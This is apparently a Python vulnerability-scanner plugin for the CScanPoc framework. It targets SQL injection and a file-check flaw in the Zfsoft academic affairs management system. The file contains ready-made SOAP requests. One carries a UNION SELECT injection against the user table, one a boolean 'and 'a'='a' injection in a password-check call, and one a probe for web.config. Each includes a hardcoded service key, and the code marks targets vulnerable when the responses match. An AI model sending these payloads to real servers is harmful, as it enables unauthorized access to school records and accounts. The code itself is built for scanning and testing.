# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse, httplib

class Vuln(ABVuln):
    vuln_id = 'Zfsoft_0001' # 平台漏洞编号，留空
    name = '正方教务管理系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-24'  # 漏洞公布时间
    desc = '''
        正方教务管理系统
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '正方教务管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ff9845e8-189b-4e24-97f0-fa4fa7bd7e77'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0122523
            arr = urlparse.urlparse(self.target)
            hh = hackhttp.hackhttp()
            raw1='''
POST /service.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://www.zf_webservice.com/GetStuCheckinInfo "

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,'testvul',Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01</xh>
      <xnxq xsi:type="xsd:string">2013-2014-1</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
            raw2='''POST /file.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://zfsoft/zfjw/file/checkFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <checkFile xmlns="http://zfsoft/zfjw/file">
      <fileDir>./web.config</fileDir>
    </checkFile>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
            raw3='''POST /service.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: 795
SOAPAction: "http://www.zf_webservice.com/BMCheckPassword"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:BMCheckPassword xmlns:q1="http://www.zf_webservice.com/BMCheckPassword">
      <strYHM xsi:type="xsd:string">jwc01'and 'a'='a</strYHM>
      <strPassword xsi:type="xsd:string">string</strPassword>
      <xh xsi:type="xsd:string">string</xh>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:BMCheckPassword>
  </soap:Body>
</soap:Envelope>''' % arr.netloc

            url1 = self.target + '/service.asmx'
            url2 = self.target + '/file.asmx'
            url3 = self.target + '/service.asmx'
            code1, head1,res1, errcode1, _ = hh.http(url1, raw=raw1)
            code2, head2,res2, errcode2, _ = hh.http(url2, raw=raw2)
            code3, head3,res3, errcode3, _ = hh.http(url3, raw=raw3)
            if code1 == 200 and 'testvul' in res1:
                #security_hole("GetStuCheckinInfo injection  %s" % target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if code2 == 200 and '<checkFileResult>true</checkFileResult>' in res2:
                #security_hole("checkFile injection  %s" % target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if code3 == 200 and "type=\"xsd:int\">5</BMCheckPasswordResult><xh xsi:type=\"xsd:string\">jwc01</xh>" in res3:
                #security_hole('BMCheckPassword inject %s' % target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name)) 
                

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
